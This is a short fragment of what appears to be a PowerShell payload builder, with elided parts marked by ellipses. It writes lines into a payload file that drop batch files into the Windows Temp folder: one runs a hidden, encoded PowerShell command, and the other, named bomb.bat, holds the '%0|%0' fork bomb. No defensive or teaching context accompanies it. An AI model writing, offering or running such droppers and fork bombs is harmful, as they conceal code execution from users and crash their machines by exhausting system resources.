...
Write-Output 'echo "powershell -W hidden -e $cmd" | out-file -encoding utf8 C:\Windows\Temp\payload.bat' >> .\payload.txt
...
Write-Output 'echo "%0|%0" | out-file -encoding utf8 C:\Windows\Temp\bomb.bat' >> .\payload.txt
